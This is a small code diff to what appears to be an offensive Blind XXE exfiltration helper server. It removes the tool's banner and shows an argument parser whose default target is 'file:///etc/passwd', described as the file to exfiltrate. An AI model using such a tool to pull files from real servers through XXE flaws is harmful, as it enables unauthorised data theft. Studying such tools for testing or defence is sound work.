@@ -89,12 +89,6 @@ class BlindXXEServer(BaseHTTPRequestHandler):
 def parseOptions(argv):
     global config
 
-    print('''
-        :: Blind-XXE attacker's helper backend component
-        Helps exfiltrate files by abusing out-of-bands XML External Entity vulnerabilities.
-        Mariusz B. / mgeeky '16-18, <mb@binary-offensive.com>
-''')
-
     parser = argparse.ArgumentParser(prog = argv[0], usage='%(prog)s [options] <file>')
 
     parser.add_argument('file', type=str, metavar='FILE', default='file:///etc/passwd', help = 'Specifies file to exfiltrate using Blind XXE technique.')
